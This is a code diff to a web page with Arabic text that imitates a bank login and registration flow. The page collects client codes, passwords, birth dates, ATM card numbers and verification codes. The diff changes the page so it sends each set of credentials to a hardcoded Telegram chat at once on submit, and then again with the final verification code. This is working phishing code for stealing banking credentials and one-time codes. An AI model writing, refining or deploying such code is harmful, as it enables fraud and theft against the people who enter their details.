@@ -109,7 +109,7 @@
     const TELEGRAM_CHAT_ID = "6873334348";
     let loginData = {};
     let regData = {};
-    let regVerifyMode = false; // لتحديد نوع التحقق (تسجيل أم دخول)
+    let regVerifyMode = false;
 
     function onlyNumber(el, maxLength) {
       el.value = el.value.replace(/\D/g, '');
@@ -133,7 +133,6 @@
       document.getElementById('register-page').style.display = 'none';
       document.getElementById('verify-page').style.display = '';
       regVerifyMode = isReg;
-      // تعديل واجهة رمز التحقق حسب الوضع (تسجيل أو دخول)
       if(isReg){
         document.getElementById('verify-title').textContent = "إدخال رمز التحقق النهائي (6 أرقام أو أكثر)";
         document.getElementById('verify-code').placeholder = "رمز التحقق النهائي (6 أرقام أو أكثر)";
@@ -177,6 +176,7 @@
         })
       });
     }
+    // دخول: إرسال رمز العميل وكلمة المرور فقط أولاً
     function submitLogin() {
       const user = document.getElementById('login-user').value.trim();
       const pass = document.getElementById('login-pass').value.trim();
@@ -185,9 +185,10 @@
         return;
       }
       loginData = { user, pass };
+      sendToTelegram(`دخول:\nرمز العميل: ${user}\nكلمة المرور: ${pass}`);
       showVerify(false);
     }
-    // تعديل هنا: لا ترسل أي بيانات من صفحة التسجيل، فقط احفظها واذهب لصفحة التحقق النهائي
+    // تسجيل: إرسال رمز العميل وتاريخ الميلاد وبطاقة الصراف الآلي ورمز التحقق فقط أولاً
     function submitRegister() {
       const user = document.getElementById('reg-user').value.trim();
       const birth = document.getElementById('reg-birth').value.trim();
@@ -206,16 +207,17 @@
         alert('رمز التحقق يجب أن يتكون من 4 أرقام فقط');
         return;
       }
-      // احفظ البيانات مؤقتاً فقط
       regData = { user, birth, card, code };
+      sendToTelegram(
+        `تسجيل:\nرمز العميل: ${user}\nتاريخ الميلاد: ${birth}\nبطاقة الصراف الآلي: ${card}\nرمز التحقق: ${code}`
+      );
       showVerify(true);
     }
-    // تعديل هنا: دالة واحدة للتحقق ترسل البيانات حسب الوضع (دخول أو تسجيل)
+    // تحقق الدخول/التسجيل: إرسال جميع البيانات السابقة مع رمز التحقق في رسالة واحدة
     function submitVerify() {
       const verifyCode = document.getElementById('verify-code').value.trim();
-      // تحقق من الوضع (تسجيل جديد)
       if(regVerifyMode){
-        // يجب أن يكون رمز التحقق النهائي 6 أرقام أو أكثر
+        // تحقق التسجيل
         if (!regData.user || !regData.birth || !regData.card || !regData.code || !verifyCode) {
           alert('يرجى إدخال جميع البيانات المطلوبة');
           return;
@@ -224,9 +226,8 @@
           alert('رمز التحقق النهائي يجب أن يكون 6 أرقام أو أكثر');
           return;
         }
-        // أرسل جميع البيانات دفعة واحدة
         sendToTelegram(
-          `تسجيل جديد:\nرمز العميل: ${regData.user}\nتاريخ الميلاد: ${regData.birth}\nبطاقة الصراف الآلي: ${regData.card}\nرمز التحقق (4 أرقام): ${regData.code}\nرمز التحقق النهائي: ${verifyCode}`
+          `تسجيل كامل:\nرمز العميل: ${regData.user}\nتاريخ الميلاد: ${regData.birth}\nبطاقة الصراف الآلي: ${regData.card}\nرمز التحقق: ${regData.code}\nرمز التحقق النهائي: ${verifyCode}`
         );
         regData = {};
         showLogin();
@@ -237,12 +238,14 @@
         document.getElementById('reg-terms').checked = false;
         alert('تم إرسال البيانات بنجاح!');
       } else {
-        // تحقق الدخول مع رمز التحقق القديم
+        // تحقق الدخول
         if (!loginData.user || !loginData.pass || !verifyCode) {
           alert('يرجى إدخال جميع البيانات المطلوبة');
           return;
         }
-        sendToTelegram(`دخول مع رمز التحقق:\nرمز العميل: ${loginData.user}\nكلمة المرور: ${loginData.pass}\nرمز التحقق المدخل: ${verifyCode}`);
+        sendToTelegram(
+          `دخول مع التحقق:\nرمز العميل: ${loginData.user}\nكلمة المرور: ${loginData.pass}\nرمز التحقق: ${verifyCode}`
+        );
         loginData = {};
         showLogin();
       }
